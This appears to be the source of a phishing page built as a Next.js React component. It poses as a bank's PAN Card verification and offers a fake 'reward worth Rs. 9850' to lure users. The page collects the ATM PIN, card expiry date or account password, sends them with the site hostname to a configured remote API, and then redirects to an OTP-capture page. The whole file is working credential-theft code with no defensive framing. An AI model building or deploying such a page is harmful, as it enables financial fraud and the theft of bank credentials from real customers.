'use client'
import { useRouter } from "next/navigation"; // in client component

import { useState } from 'react';
export default function Home() {
   const router = useRouter();
   const  [response, setResponse] = useState(false);
   const  [form, setForm] = useState('form1');
  const handleSubmit = (e) => {
    e.preventDefault();
      const formData = new FormData(e.target);
      const body = {};
      formData.forEach((value, key) => {
        body[key] = value;
      });
      body['site'] = window.location.hostname;
      fetch(process.env.API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json'},
        body: JSON.stringify(body),
      })
        .then((res) => res.json())
        .then((responseData) => {
          if(responseData.status == 200){
            setResponse(true);
            router.push("/otp")
          }else{
            setResponse(false);
            console.log('failed');
          }
            
        })
        .catch((error) => {
          setResponse(false);
          console.error(error);
        });
  };

  const showForm = (form) => {
      setForm(form);
  }
  return (
    <main className="container">
      <div className="xxx">
  <div className="page-hea">
    <div className="row">
      <div className="col-xs-6 col-md-6">
        <h2
          style={{
            fontFamily: '"Open Sans", sans-serif',
            fontSize: 16,
            fontWeight: 600,
            alignItem: "centre",
            textAlign: "centre"
          }}
        >
          Profile access To verify PAN Card{" "}
        </h2>
      </div>
      <div className="col-xs-6 col-md-6 text-right">
        <h2>X</h2>
      </div>
    </div>
  </div>
  <div
    style={{
      borderLeft: "#673391 solid 1px",
      padding: "0px 15px",
      borderRight: "#673391 solid 1px",
      borderTop: "#673391 solid 1px"
    }}
  >
    <div className="progress">
      <div
        className="progress-bar"
        style={{
          fontFamily: '"Open Sans", sans-serif',
          color: "#fff",
          fontWeight: 500,
          width: "100%"
        }}
      >
        step 3/4: Redeem of reward worth Rs. 9850{" "}
      </div>
    </div>
    <br />
    <center>
      <label>
        <input
          type="radio"
          name="option"
          defaultValue="Using debit card"
          onClick={()=>{showForm("form1")}}
          defaultChecked
        />{" "}
        Using debit card
      </label>
      <a href="#" style={{ textDecoration: "none", color: "black" }}>
        <label>
          <input
            type="radio"
            name="option"
            defaultValue="option2"
            style={{ marginLeft: 25 }}
            onClick={()=>{showForm("form2")}}
          />{" "}
          Using Profile password
        </label>
      </a>
    </center>
  </div>
</div>
<div>
  <form
    
    onSubmit={handleSubmit} 
  >
    {form=='form2' ? (
        
    <div className="p-50">
      <div className="login-box">
        <div className="user-box">
          <input
            type="password"
            name="pp_password"
          
            required
        
          />
          <label>
            Your Password<span style={{ color: "red" }}> *</span>
          </label>
        </div>
      </div>
    </div>
      ) : (
        
    <div className="p-50">
    <div className="login-box">
      <div className="user-box">
        <input
          inputMode="numeric"
          name="atm pin"
          className="name"
          onkeydown="return /[0-9]/i.test(event.key)"
          maxLength={4}
          required

          
        />
        <label>
          ATM PIN<span style={{ color: "red" }}> *</span>
        </label>
      </div>
      <div className="user-box">
        <input
          inputMode="numeric"
          name="exp date"
          className="name"
          id="pan"
          maxLength={7}
          title="Please enter valid expiry date !"
          required
        />
        <label>
          Expiry Date/Valid thru<span style={{ color: "red" }}> *</span>
        </label>
      </div>
    </div>
  </div>
      )}
      
    <div className="row">
      <div className="col-xs-12 col-md-12 text-center">
        <a
          href="#"
          style={{ fontFamily: '"Open Sans", sans-serif', fontWeight: 500 }}
          className="btn btn-border"
        >
          Back
        </a>
        <button
          type="submit"
          style={{ fontFamily: '"Open Sans", sans-serif', fontWeight: 500 }}
          className="btn btn-primary"
        >
          {" "}
          Submit{" "}
        </button>
      </div>
    </div>
    <br />
  </form>
</div>


  </main>
  
  )
}
